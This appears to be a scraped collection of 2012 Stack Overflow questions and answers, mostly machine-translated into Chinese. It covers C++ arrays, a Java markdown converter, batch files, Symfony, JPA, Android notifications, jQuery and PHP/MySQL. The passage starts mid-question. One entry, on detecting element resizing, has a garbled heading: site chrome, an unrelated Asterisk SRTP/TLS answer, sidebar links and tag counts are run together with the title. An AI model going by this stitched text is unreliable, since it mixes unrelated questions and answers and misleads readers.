If( ( (int)charArray[ 0 ] - 48) > 0 ) {   // type cast to int. Neg = initialize array with 1-9
                                         // pos = initialize with original value

cell1[ 0 ] =  (int)charArray[ 0 ] - 48;
} else {

cell1[ 9 ] = { 1,2,3,4,5,6,7,8,9};
} 
```

我想避免为 81 个单元格编写此代码 81 次（被视为编写垃圾代码）。我不知道如何编写循环。我愿意接受有关如何使用类、函数等进行不同编码的建议。在此先感谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-25T05:06:17.637

将数组创建`cell`为具有 81 行和 9 列的二维数组。

```
int cell[81][9]; 
```

现在您可以使用语法遍历它们`cell[r][c]`。例如，

```
for( i = 0; i < 81; ++i ) {
  cell[i][0] = 1;
  // ...
  cell[i][8] = 9;
} 
```

如果您希望避免使用二维数组，则可以将数组声明为一维数组，并适当地对其进行索引。

```
int cell[81 * 9];

for( i = 0; i < 81; ++i ) {
  cell[i + 0*81] = 1;
  // ...
  cell[i + 8*81] = 9;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T05:09:03.403

```
int a1[9],a2[9],a3[9],a4[9],...

void init_array(int *ptr, const char *chr, int len, int start){
  for(int i = start; i < len; i++){
     if(chr[i] == '.')continue;
     ptr[i] = chr[i]-'0';//converts character to integer.
  }
}

int main(int argc, char **argv)
{
    std::string str;
    cin >> str;
    init_array(a1,str.c_str(),9,0); init_array(a2,str.c_str(),9,9/*increment by 9*/);...
    //.. 
    return 0;
} 
```

编写一个名为的函数，该函数`init_array()`接受一个整数指针并为您初始化数组。您可以通过这种方式避免重复代码。

# java - markdown algorithm java; converter problems

> ID：13061871
> 
> 赞同：0
> 
> 时间：2012-10-25T05:02:34.570
> 
> 标签：java, markdown

```
public class Md2html {
    public static void main(String[] args) throws IOException {

       String stringToConvert = new Scanner(System.in).nextLine();
       System.out.println(convert(stringToConvert));

    }

    public static String convert(String str) {

         if (str.equals("# "))
             System.out.println(" ");

         Pattern pattern = Pattern.compile("(#+[^#]+)");
         Matcher matcher = pattern.matcher(str);

         while (matcher.find()) {
             String str1 = matcher.group(1);
             if(str1.replaceFirst("#+", "").length() == 0 ||
                str1.replaceFirst("#+", "").matches("[\\s]+")) 
                      continue;
             int n = str1.length() - str1.replaceFirst("#+", "").length();
             System.out.println("<h" + n + ">" + str1.substring(n) + 
                                "</h" + n + ">");

             double carac;
             carac = str.charAt(0);
             if(carac>65 & carac <=90) {
                  System.out.print("<p>");
                  System.out.println(str);
                  System.out.println("<p>");
             }
        }

        return ("");
    }     
} 
```

Ok, so now I have an algorithm that converts # to < h1> < h2> depending on the number of #...I'm now trying to add < p> at the beginning of a paragraph and < /p> at the end of it. For some reason,the second part of the converter, which is supposed to add < p> at the beginning and < /p> at the end of a paragraph doesnt seem to work (it's the code starting with double carac). Can someone tell me what I'm doing wrong???

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T05:14:21.980

You are printing two opening tags for a paragraph if the string starts with an uppercase letter and no closing tag. Replace

```
System.out.print("<p>");
System.out.println(str);
System.out.println("<p>"); 
```

with

```
System.out.print("<p>");
System.out.println(str);
System.out.println("</p>"); //<--here 
```

Also, you should use a logical AND `&&` instead of a bitwise AND `&` for boolean operations.

Also, [`String#charAt(int)`](http://docs.oracle.com/javase/1.4.2/docs/api/java/lang/String.html#charAt%28int%29) returns a `char`, not a `double`. You are declaring `carac` as a `double`. Declare as a `char` instead.

# batch-file - 如何从文件中读取变量并将它们设置在批处理文件中？

> ID：13061874
> 
> 赞同：0
> 
> 时间：2012-10-25T05:02:56.003
> 
> 标签：batch-file

我有一个文本文件，其中有两个变量 CVERSION=1.0.0.0 和 PVERSION=1.0。我希望 bach 脚本将这两个变量分别读取到批处理文件中的变量 DVERSION 和 PVERSION 中。我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T05:38:11.857

您可以将 findstr 与 FOR /F 循环结合使用。

```
FOR /F "usebackq tokens=2 delims==" %%V in (`FINDSTR CVERSION myFile.txt`) DO (
  set "myCVersion=%%V"
)
echo %myCVersion% 
```

# ruby - 如何制作没有默认字段的 sqlite3 数据库？

> ID：13061878
> 
> 赞同：1
> 
> 时间：2012-10-25T05:03:21.767
> 
> 标签：ruby, sqlite

> **可能重复：**
> [created_at 和 updated_at 列来自哪里？](https://stackoverflow.com/questions/4722785/where-do-the-created-at-and-updated-at-columns-come-from)

每次我使用`db:migrate`时，我的表都会创建良好的预期字段，但它也有`created_at`and`updated_at`列，这是我不想要的，也没有包含在我的迁移中。如何删除它们，或者更好的是，如果没有这些字段，将来如何创建表？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T05:33:04.287

`t.timestamps`您可以通过从模型迁移文件中删除行来删除列。

# php - 找不到 symfony 控制器类

> ID：13061879
> 
> 赞同：1
> 
> 时间：2012-10-25T05:03:30.043
> 
> 标签：php, symfony

我是 symfony 的新手，也许我错过了一些非常简单的东西，但我无法发现它。任何帮助都感激不尽。我有这两个文件：

C:\xampp\htdocs\Symfony\src\Apps01\ResourceCalBundle\Resources\config\routing.yml

```
ResourceCalendar_Login:
    pattern:   /resourcecalendar/login
    defaults:  { _controller: AppsRollerResourceCalBundle:Login:DisplayLogin } 
```

C:\xampp\htdocs\Symfony\src\Apps01\ResourceCalBundle\Controller\LoginController.php

```
use Symfony\Bundle\FrameworkBundle\Controller\Controller;
use Symfony\Component\HttpFoundation\Response;

class LoginController
{
public function DisplayLoginAction()
{
    return new Response('<html><body>Hello There!</body></html>');
}
} 
```

然而，当我将浏览器指向[http://example.com/Symfony/web/app_dev.php/resourcecalendar/login](http://example.com/Symfony/web/app_dev.php/resourcecalendar/login)时，出现以下错误：

```
 The autoloader expected class "Apps01\ResourceCalBundle\Controller\LoginController" to be defined in file "C:\xampp\htdocs\Symfony/src/\Apps01\ResourceCalBundle\Controller\LoginController.php". The file was found but the class was not in it, the class name or namespace probably has a typo.
 500 Internal Server Error - RuntimeException 
```

`LoginController`当我看到类肯定存在于文件管理器中时，有人能指出我缺少什么吗？

谢谢艾尔

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T05:10:56.400

我认为首先你应该定义一个命名空间

```
namespace Apps01\ResourceCalBundle\Controller; 
```

正如您的错误在这里告诉您的那样：

“命名空间可能有错字。”

# java - 如何在 bean 列表中搜索属性？

> ID：13061882
> 
> 赞同：1
> 
> 时间：2012-10-25T05:03:37.273
> 
> 标签：java, collections, map, javabeans, apache-commons

我有一个 Order 对象列表-

```
class Order {
Date date;
float amount;
String companyCode;
}
List<Order> orders = /* Initialize with list of order objects with valid data */ 
```

我有一个公司对象列表-

```
class Company {
String name;
String code;
String address;
}
List<Company> companies = /* Initialize with list of company objects with valid data */ 
```

我需要一个创建公司代码和名称的地图。

是否有一些库可以让我编写这样的代码（其中 BeanSearch 是假设的库类）？

```
Map<String, String> codeAndName = new HashMap<String, String>();
for(Order o: orders) {
   codeAndName.put(o.getCompanyCode(), 
                   BeanSearch.find(companies, "code", o.getCompanyCode).getName());
} 
```

或者还有另一种好方法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T05:09:15.763

[http://commons.apache.org/collections/apidocs/org/apache/commons/collections/CollectionUtils.html](http://commons.apache.org/collections/apidocs/org/apache/commons/collections/CollectionUtils.html) should work for you right? Specifically you can use the find method

# asp.net-mvc-4 - WebAPI 路由模板自定义

> ID：13061883
> 
> 赞同：0
> 
> 时间：2012-10-25T05:03:47.817
> 
> 标签：asp.net-mvc-4, asp.net-web-api

我试图弄清楚是否可以更改 WebAPI 的 routeTemplate 格式。

目前默认设置为`api/{controller}/{id}`

我想知道是否可以将“api”部分更改为其他内容，以便格式类似于

`myapi/{controller}/{id}`

我在 global.asax.cs 文件中对其进行了更改，但是当我构建项目时，为了加载服务，它仍然需要我浏览`/api/`而不是我放置的内容。

提前致谢 ：）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T06:20:31.117

您使用的是 MVC 4 的 RTM 版本吗？

我问的原因是在 RTM 中 HTTP 路由在 App_Start\WebApiConfig.cs 中，是的，在这里将路由从“api”更改为“myapi”应该可以。

```
public static class WebApiConfig
{
    public static void Register(HttpConfiguration config)
    {
        config.Routes.MapHttpRoute(
            name: "DefaultApi",
            routeTemplate: "api/{controller}/{id}",
            defaults: new { id = RouteParameter.Optional }
        );
    }
} 
```

# jquery - 如何将“a”显示为整行

> ID：13061885
> 
> 赞同：0
> 
> 时间：2012-10-25T05:04:03.253
> 
> 标签：jquery, css

当鼠标悬停在 MAIN 时会显示子菜单，但子菜单不会完全显示该行。如何让MAIN 1下的“SUB 1”在行内全显示？

我不想设置宽度，因为另一个主菜单的子菜单必须是短文本。

**HTML**

```
<ul id="menu">
            <li><a href="#" title="MAIN 1">MAIN 1</a>
                <ul>
                    <li><a href="#" title="SUB 1">SUB 1</a></li>
                    <li><a href="#" title="SUB 1 XXXX XXXXX SUB 1">SUB 1 XXXX XXXXX SUB 1</a></li>
                </ul>
            </li>
            <li><a href="#" title="MAIN 2">MAIN 2</a></li>
            <li><a href="#" title="MAIN 1">MAIN 3</a>
                <ul>
                    <li><a href="#" title="SUB 3">SUB 3 XXXX</a></li>
                    <li><a href="#" title="SUB 3 XXXX SUB 1">SUB 3 XXXX</a></li>
                </ul>
            </li> 
```

**CSS**

```
#menu{margin:0;padding:0;list-style:none;}
#menu li{float:left;display:block;background:#ccc;position:relative;z-index:500;margin:0 1px;}
#menu li a{display:block;padding:4px 8px 0 8px;font-weight:700;height:23px;text-decoration:none;color:#4C4C4C;}
#menu li a:hover{color:#ffaa00;}
#menu a.selected{color:#f00;}
#menu ul{position:absolute;left:0;display:none;margin:0 0 0 -1px;padding:0;list-style:none;background-color:#000000}
#menu ul li{white-space:nowrap;float:left;border-top:1px solid #fff;}
#menu ul a{display:block;height:15px;padding:8px 5px;color:#666;text-align:left;}
#menu ul a:hover{text-decoration:underline;}
*html #menu ul{margin:0 0 0 -2px;} 
```

**Javascript**

```
$('#menu li').hover(
                function () {
                    //show its submenu
                    $('ul', this).slideDown(100);

                },
                function () {
                    //hide its submenu
                    $('ul', this).slideUp(100);            
                }
            ); 
```

[http://jsfiddle.net/Dgaxh/](http://jsfiddle.net/Dgaxh/)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-25T05:07:44.977

你去 [JSFiddle](http://jsfiddle.net/mJEuk/)

我只是添加`width: 100%`到`#menu ul li`div id，通过设置为 100% 它将适应另一行中最长的文本。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T05:10:27.150

请试试这个：

我们可以将每个 li 位置的宽度设置为 100%。

```
#menu li ul li {min-width:100%} 
```

# android - 如何使用位图作为通知图标

> ID：13061890
> 
> 赞同：5
> 
> 时间：2012-10-25T05:04:23.063
> 
> 标签：android, bitmap, notifications

我想在图片上画点东西，完成之后，它就是一个位图。我想将此位图作为其图标添加到通知中。但它的图标必须是一个 int Id 。我怎样才能做到？谢谢你的回答~~~~请帮帮我！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-25T05:25:36.040

从这篇[文章](https://stackoverflow.com/questions/2059933/setting-an-android-notification-icon-to-a-remote-url)中，我知道通知图标将获取资源图像。所以你不能在小图标中做动态。但是你可以为 Api Level 11 的大图标做。

为此，您可以`Notificaiton.Builder` [在此处使用参考](https://stackoverflow.com/questions/11379518/android-change-notification-icon)

其他方式也有。也就是说，您可以更改下拉通知时出现的图标。为此，您必须使用`RemoteViews`

[参考这里](https://stackoverflow.com/questions/7699119/custom-status-bar-notification-for-background-download)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-25T05:10:56.917

You can put image file in res->drawable (or drawable-hdpi,ldpi,mdpi), for example notify.png and use it

```
myNotification = new Notification(R.id.notify, "Notification!", System.currentTimeMillis()); 
```

or

Try using AnimationDrawable's. You can use them to combine multiple drawables into a single one, and select the one you want to display. I really think, this is the way to go.

More info: AnimationDrawable

Off course, you will have to provide individual drawables for all your Integers you want to display, but this way, you can easily change the appearance of your notifications

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-25T05:21:20.947

尝试这个：

```
NotificationManager notificationManager=
            (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
int icon=R.drawable.ic_launcher;
CharSequence text="Notification Text";
long when=System.currentTimeMillis();

Notification notification=new Notification(icon, text, when);
notificationManager.notify(Constants.NOTIFICATION_ID, notification); 
```

我采用了默认图像，您可以将图像文件保存在 res->drawable（或 drawable-hdpi、ldpi、mdpi）文件夹中。将任何位图分配给图标，您将获得所需的输出。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-09-22T15:46:37.493

如果您使用的是 Android Studio，您始终可以将原始图像转换为图像资源，并且应该生成您可以轻松使用的正确图像格式，即分配一个 ID。您可以选择覆盖默认资源名称或使用其他名称。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2014-04-02T03:03:08.077

尝试使用 xml 绘制图像，并将其放入像 n.icon = R.drawable.x 这样的图标中；

可绘制/x.xml

```
<?xml version="1.0" encoding="utf-8"?>
<layer-list
  xmlns:android="http://schemas.android.com/apk/res/android">
    <item android:drawable="@drawable/write_normal_battery1" />
    <item android:drawable="@drawable/notif_0" android:left="5.5dip" android:right="13.5dip" />
    <item android:drawable="@drawable/notif_9" android:left="13.5dip" android:right="5.5dip" />
</layer-list> 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-10-25T05:13:02.470

将您的位图转换为可绘制对象，然后您可以将其用作对话框中的通知图标。

# php - 联合查询后如何更新？

> ID：13061891
> 
> 赞同：1
> 
> 时间：2012-10-25T05:04:34.483
> 
> 标签：php, mysql, database

我有 2 表如下所示，

```
coin
----
chanceNo
userID
coin_code
date

coin2
----
chanceNo
userID
coin_code
date 
```

我的查询查找“12345”在哪个表的位置，如下所示（这是正确且成功的搜索和匹配），

```
SELECT coin_code from coin WHERE coin_code='12345' UNION 
Select coin_code from coin2 WHERE coin_code='12345'; 
```

但是，我坚持在搜索后更新查询。找到 coin_code='12345' 后如何更新。

我知道基本的更新查询是这样的，

```
UPDATE coin2 SET userID='name', date='12-12-12' WHERE coin_code='12345' 
```

但是，如果“12345”在另一张桌子上怎么办，硬币？我可以知道，如何编写这个查询？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T05:24:18.343

此查询将告诉您在哪个表中找到了 coin_code：

```
SELECT "coin" which_table, coin_code
FROM coin
WHERE coin_code = '12345'
UNION
SELECT "coin2" which_table, coin_code
FROM coin2
WHERE coin_code = '12345' 
```

现在您有了表名，您可以将其替换为 UPDATE 查询：

```
$row = mysqli_fetch_assoc($sel_stmt);
$upd_stmt = mysqli_prepare("UPDATE {$row[which_table]} SET userID = ?, date = ? WHERE coin_code = ?"); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T05:36:24.310

扩展 Barmar 的答案，你可以做这样的事情，

```
$sql="SELECT 'coin' which_table, coin_code
      FROM coin
      WHERE coin_code = '12345'
      UNION
      SELECT 'coin2' which_table, coin_code
      FROM coin2
      WHERE coin_code = '12345'";
$result = mysqli_query($sql);
while($row = mysqli_fetch_array($result, MYSQLI_ASSOC)){

     //Now updating the table
     $sql_update = "UPDATE {$row['which_table']} SET userID='name', date='12-12-12' 
               WHERE coin_code='{$row['coin_code']}'";
     mysqli_query($sql_update);
} 
```

# android - 为什么启动时显示初始空白活动？

> ID：13061895
> 
> 赞同：2
> 
> 时间：2012-10-25T05:04:55.310
> 
> 标签：android

在我的 android 应用程序中，我有一个初始活动，它会弹出一个对话框（用作启动屏幕）。我正在这样做：

```
 @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Popup a fullscreen dialog (used as splash)
        showSplashScreen();
 } 
```

然而，在此之前有一小段时间，我的徽标和标题栏出现空白。我根本不知道如何从显示中删除它。我什至试图看看这是否来自同一个活动，我通过请求没有标题栏来删除标题栏来检查。但是，我没有运气......这个神秘的空白活动出​​现了一小段时间。

像 facebook 这样的应用程序如何首先显示初始启动屏幕而不显示其他任何内容？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-10-25T05:08:26.090

1.  `setContentView(R.layout.layout_name);`在代码中 使用。

2.  将要在清单文件中作为对话框打开的 Activity 描述为：

    ```
    <activity
        android:name=".Description_Activity"
        android:screenOrientation="portrait"
        android:theme="@android:style/Theme.Dialog" >
    </activity> 
    ```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-10-25T05:20:01.347

```
requestWindowFeature(Window.FEATURE_NO_TITLE); 
```

在 onCreate 或

```
android:theme=”@android:style/Theme.NoTitleBar” 
```

在清单的活动标签中应该隐藏标题栏。

请确保此活动是您开始时的第一个活动。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-07-11T11:51:50.413

我在自定义样式中添加了以下行：

```
<item name="android:windowDisablePreview">true</item> 
```

# foursquare - Foursquare 初学者

> ID：13061898
> 
> 赞同：2
> 
> 时间：2012-10-25T05:05:28.037
> 
> 标签：foursquare

我正在寻找一个“愚蠢的”教程，教如何使用 API 进行编码。我有使用 HTML 和 PHP 的经验，但老实说，我没有得到大部分 Foursquare 教程。我觉得有一些我应该知道的简单的东西，但我就是不知道。有任何想法吗？

# servlets - GAE + JPA：java.lang.NoClassDefFoundError：无法初始化类 EMF

> ID：13061902
> 
> 赞同：7
> 
> 时间：2012-10-25T05:05:54.497
> 
> 标签：servlets, jpa, eclipselink, google-cloud-sql

当我尝试通过 JPA 连接我的 Cloud SQL 时，会生成以下错误：

```
2012-10-25 10:07:38.439
Error for /jpatest
java.lang.NoClassDefFoundError: Could not initialize class com.my.jpa.EMF
    at com.my.jpa.ContactService.createContact(ContactService.java:20)
    at com.my.jpa.JPATestServlet.doGet(JPATestServlet.java:14)
    at javax.servlet.http.HttpServlet.service(HttpServlet.java:617)

2012-10-25 10:07:38.440
Uncaught exception from servlet
java.lang.NoClassDefFoundError: Could not initialize class com.my.jpa.EMF
    at com.my.jpa.ContactService.createContact(ContactService.java:20)
    at com.my.jpa.JPATestServlet.doGet(JPATestServlet.java:14)
    at javax.servlet.http.HttpServlet.service(HttpServlet.java:617) 
```

我的 EMF 课程是

```
public final class EMF {
    private static final EntityManagerFactory emfInstance = Persistence
            .createEntityManagerFactory("JPATest");

    private EMF() {
    }

    public static EntityManagerFactory get() {
        return emfInstance;
    }
} 
```

EMF 初始化部分是

```
 public class ContactService {
        private static Logger logger = Logger.getLogger(ContactService.class
                .getName());

        public void createContact(Contact c) {
            logger.info("Entering createContact: [" + c.getFirstName() + ","
                    + c.getLastName() + "]");
            EntityManager mgr = EMF.get().createEntityManager();
            try {
                mgr.getTransaction().begin();
                mgr.persist(c);
                mgr.getTransaction().commit();
            } finally {
                mgr.close();
            }
            logger.info("Exiting createContact");
        }
} 
```

我的 Servlet 是：

```
public class JPATestServlet extends HttpServlet {
    public void doGet(HttpServletRequest req, HttpServletResponse resp)
            throws IOException {        
        ContactService service = new ContactService();
        service.createContact(new Contact("Manu", "Mohan", "686019", "TVM"));
        resp.setContentType("text/plain");
        resp.getWriter().println("Hello, world");
    }
} 
```

web.xml 是

```
<?xml version="1.0" encoding="utf-8"?>
<web-app xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xmlns="http://java.sun.com/xml/ns/javaee"
xmlns:web="http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd"
xsi:schemaLocation="http://java.sun.com/xml/ns/javaee
http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd" version="2.5">
    <servlet>
        <servlet-name>JPATest</servlet-name>
        <servlet-class>com.my.jpa.JPATestServlet</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>JPATest</servlet-name>
        <url-pattern>/jpatest</url-pattern>
    </servlet-mapping>
    <welcome-file-list>
        <welcome-file>index.html</welcome-file>
    </welcome-file-list>
</web-app> 
```

持久性.xml

```
<?xml version="1.0" encoding="UTF-8"?>
<persistence version="2.0"
    xmlns="http://java.sun.com/xml/ns/persistence" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://java.sun.com/xml/ns/persistence http://java.sun.com/xml/ns/persistence/persistence_2_0.xsd">
    <persistence-unit name="JPATest">
        <provider>org.eclipse.persistence.jpa.PersistenceProvider</provider>
        <class>com.my.jpa.Contact</class>
        <properties>
            <property name="javax.persistence.jdbc.driver" value="com.google.cloud.sql.Driver" />
            <property name="javax.persistence.jdbc.url" value="jdbc:google:rdbms://instance-name/stock" />
            <property name="javax.persistence.jdbc.user" value="" />
            <property name="javax.persistence.jdbc.password" value="" />
            <!-- EclipseLink should create the database schema automatically -->
            <property name="eclipselink.ddl-generation" value="create-tables" />
            <property name="eclipselink.ddl-generation.output-mode"
                value="database" />
        </properties>
    </persistence-unit>
</persistence 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T06:42:26.633

是否需要使用`final`for `EntityManagerFactory`in `EMF`。尝试`Singleton Design Pattern`使用`EMF`. `EntityManagerFactory`类是线程安全的。

EMF.java

```
public final class EMF {
    private EntityManagerFactory emfInstance;

    private static EMF emf;

    private EMF() {
    }

    public EntityManagerFactory get() {
        if(emfInstance == null) {
            emfInstance = Persistence.createEntityManagerFactory("JPATest");
        }
        return emfInstance;
    }

    public static EMF getInstance() {
        if(emf == null) {
            emf = new EMF();
        }
        return emf;
    }
}

// usages
EntityManagerFactory emf = Emf.getInstance().get(); 
```

[这](http://javanotepad.blogspot.com/2007/05/jpa-entitymanagerfactory-in-web.html)`EntityManagerFactory`是在网络应用程序中使用的更好方法。

# java - HTML5 移动应用安全

> ID：13061906
> 
> 赞同：0
> 
> 时间：2012-10-25T05:06:23.173
> 
> 标签：java, web-services, html, spring-security

我正在开发一个 html5+jquery+phonegap 应用程序。服务器端是用**java和Spring** MVC编写的。我希望实现一个认证模型如下。

1.  客户使用他的电子邮件注册，该电子邮件将用作他的用户 ID。
2.  一个令牌被发送到他的电子邮件。
3.  给他一个屏幕来输入令牌。
4.  该令牌存储在客户端的本地存储中。
5.  每次客户端调用 Web 服务时，应用程序都会通过 https 发送他的用户 ID 和令牌。
6.  服务器对他进行身份验证并做出响应。

从服务器端实现这种安全性的选项有哪些？可以这样使用Spring-security吗？我试图找到 Spring-security 的任何实现，但除了基本身份验证之外找不到任何实现。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T07:37:14.597

您可以使用 PreAuthenticationProcessingFilter 来实现这个要求，看看类似的[案例](https://stackoverflow.com/questions/9902783/preauthentication-with-spring-security-based-on-url-parameters)和 spring security [doc](http://static.springsource.org/spring-security/site/docs/3.0.x/reference/preauth.html)

# jquery - 试图弄清楚如何使这个函数 on()

> ID：13061909
> 
> 赞同：0
> 
> 时间：2012-10-25T05:06:31.403
> 
> 标签：jquery, infinite-scroll

以下是倒计时函数，我似乎无法弄清楚如何将 on() 函数放入其中。jquery 文档没有给出一个可以很好地翻译这个倒计时的例子。甚至可能吗？

本质上，我有无限数量的帖子，而且它们都一次加载无限滚动一页。与页面一起加载的初始帖子都有有效的到期日期，但无限滚动加载的第二、第三等页面没有到期日期。我假设这是 on() 的情况，但我可能是错的。

```
<script type="text/javascript">

jQuery(function () {
    var date = new Date ('December 1, 2012 02:39:00' );
    jQuery('#countdown-timer-9968').countdown( { until: date, timezone: 0, compact: true, format: 'DHMS', description: '' } ); );
}

    );</script> 
```

# javascript - 检测何时的宽度/高度 element is changed I'm debugging some php + javascript code, mostly yui. There is a video on the page using an element. Just after the page is loaded, the object's width and height are adjusted. I can 问问题 问问题 2012-10-25T05:06:46.740 159 次 This question shows research effort; it is useful and clear 2 This question does not show any research effort; it is unclear or not useful Bookmark this question. Show activity on this post. I'm debugging some php + javascript code, mostly yui. There is a video on the page using an element. Just after the page is loaded, the object's width and height are adjusted. I can literally see it being resized. It only happens in IE9... There's a ton of Javascript. I'm using the developer tools in IE9.... I can watch the values in developer tools eg: document.getElementById("myvideo").clientWidth; document.getElementById("myvideo").clientHeight; But I can't pause when the values are changed. I've tried stepping through pressing F11 but its starting to send me a little bit nuts... Any suggestions on how I can detect what code is resizing the object? Asterisk 1.8 has native support for SRTP. So you can easily try this with a Asterisk 1.8.x server. The normal SIP phones are not support for this system. You need to find SRTP supported and TLS supported IP/soft phones for setup this. Use blink soft-phone for this (http://www.icanblink.com). I followed following article to setup secure VoIP system. For SRTP : http://www.remiphilippe.fr/2011/01/16/asterisk-srtp-with-1-8/ For TLS : https://wiki.asterisk.org/wiki/display/AST/Secure+Calling+Tutorial, ( You can find ast_tls_cert script from here : https://reviewboard.asterisk.org/r/979/diff/) javascriptobjectresizeheightwidth 4 1 回答 1 This answer is useful 0 有点回答了 - Firebug 中有一个“属性更改中断”功能 - 但它在 Firebug lite 中不可用:( Firebug lite - 属性更改中断 - IE 于 2012-10-26T01:27:37.430 回答 Related 2 javascript - Convert geocode results into php variables to post to mysql database 2 javascript - Jquery limit text in input box 3 c++ - constness 是否应该传播到成员指针指针？ 1 ruby-on-rails - Helper method to log in in Minitest 0 xml - Float image in PDF using xsl:fo 1 orchardcms - 您如何在 Orchard 中删除或重命名内容部分？ 3 open-source - 最初在 GPL 下发布的项目可以在未来的版本中“关闭”吗？ 1 python - When POSTing a Django form, my changes to the form's data are lost 1 json - 在 POJO 中包含类名 - JSON Marshalling 5 c# - 类型约束 Reference php × 1429865 c/c++ × 756500 nginx × 49975 mongodb × 159057 mybatis × 3233 anaconda × 13410 pycharm × 14671 python × 1902243 vscode × 56040 docker × 110988 github × 49000 flask × 49129 ffmpeg × 24037 jmeter × 16910 matplotlib × 63493 bootstrap × 54641

> ID：13061910
> 
> 赞同：2
> 
> 时间：
> 
> 标签：javascript, object, resize, height, width

I'm debugging some php + javascript code, mostly yui.

There is a video on the page using an element.

Just after the page is loaded, the object's width and height are adjusted. I can literally see it being resized.

It only happens in IE9...

There's a ton of Javascript. I'm using the developer tools in IE9....

I can watch the values in developer tools eg:

```
document.getElementById("myvideo").clientWidth;
document.getElementById("myvideo").clientHeight; 
```

But I can't pause when the values are changed.

I've tried stepping through pressing F11 but its starting to send me a little bit nuts...

Any suggestions on how I can detect what code is resizing the object?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-26T01:27:37.430

有点回答了 - Firebug 中有一个“属性更改中断”功能 - 但它在 Firebug lite 中不可用:(

[Firebug lite - 属性更改中断 - IE](https://stackoverflow.com/questions/13079577/firebug-lite-break-on-attribute-change-ie)

# javascript - JQuery 中没有方法“val”

> ID：13061911
> 
> 赞同：1
> 
> 时间：2012-10-25T05:06:49.860
> 
> 标签：javascript, jquery, forms

我有一个 HTML 表单

```
<div class="field"> 
  <label for="num1">Number 1</label> 
  <input id="num1" type="text" /> 
</div> 
<div class="field"> 
  <label for="num2">Number 2</label> 
  <input id="num2" type="text" /> 
</div> 
```

当“数字 1”更改时，我想更改“数字 2”以匹配它。所以这个JQuery代码：

```
$('#num1').change(function() {
  var one = this.val();
  $('#num2').val(one);
}); 
```

但它说：

```
Uncaught TypeError: Object #<HTMLInputElement> has no method 'val' 
```

在线上

```
var one = this.val() 
```

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-10-25T05:08:23.923

`.val()`仅在 jQuery 对象上定义。`this`返回没有此属性的 DOM 对象。

要修复您的代码：

1.  使用`$(this).val()`, 或
2.  采用`this.value`

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-10-25T05:08:20.627

`this`是 DOM 对象而不是 jquery 对象。你可以使用`this.value`或者`$(this).val()`

```
$('#num1').change(function() {
  var one = $(this).val();
 $('#num2').val(one);
 }); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-25T05:11:56.473

使用：`$(this).val();`代替`this.val();`

演示：[JSFIDDLE](http://jsfiddle.net/qUyp2/86/)

# javascript - 在 IE7 中不能通过 Javascript 调用 JQuery 函数

> ID：13061915
> 
> 赞同：0
> 
> 时间：2012-10-25T05:07:24.227
> 
> 标签：javascript, jquery, internet-explorer, html5-video

它在所有主流浏览器中都能完美运行，但在 IE7 中却不行。

Java 脚本代码为：

```
$(function() {
var $hdVid = jQuery.noConflict();
$hdVid(function() {
    $hdVid('.hd-flv-player').hdVideo();
});
}); 
```

jQuery是：

```
(function($) {

// plugin definition
$.fn.hdVideo = function(options) {
    // build main options before element iteration
    var defaults = {
        theme: 'simpledark',
        childtheme: ''
    };
    var options = $.extend(defaults, options);
    // iterate and reformat each matched element
    return this.each(function() {
        var $hdVideo = $(this);

        $hdVideo.removeAttr('controls');
        //create html structure
        //main wrapper

        var $video_wrap=$('<div id="hd-player"></div>');
        var $video_hd_html_player = $('<div id="hd_html_player"></div>').addClass('hd-video-player').addClass(options.theme).addClass(options.childtheme);
        //controls wraper
        var $video_controls = $('<div class="hd-video-main-control"></div><div class="hd-video-controls"><div class="hd-video-seek-container"><div class="hd-video-seek"></div></div><div class="hd-video-buffer-container"><div class="hd-video-buffer"></div></div><div class="hd-video-options cf"><a class="hd-video-play" title="Play/Pause"></a><div class="hd-video-timer"><span class="hd-video-timer-curr">00:00</span><span class="hd-video-sep">&nbsp;/&nbsp;</span><span class="hd-video-timer-tot-time">00:00</span></div><div class="hd-full-screen"><a class="hd-full-screen-button" title="Normal/FullScreen"></a></div><div class="hd-volume-box"><div class="hd-volume-slider-container"><div class="hd-volume-slider"></div></div><a class="hd-volume-button" title="Mute/Unmute"></a><div class="hd-volume-value-slider"></div></div><div class="hd-hd-swipe"><a class="hd-hd-swipe-button" title="High Definition / Low Definition"></a></div><div class="hd-flv-html5-switch"><a title="Switch to Flash"></a></div></div></div>');
        $video_wrap.append($video_hd_html_player);
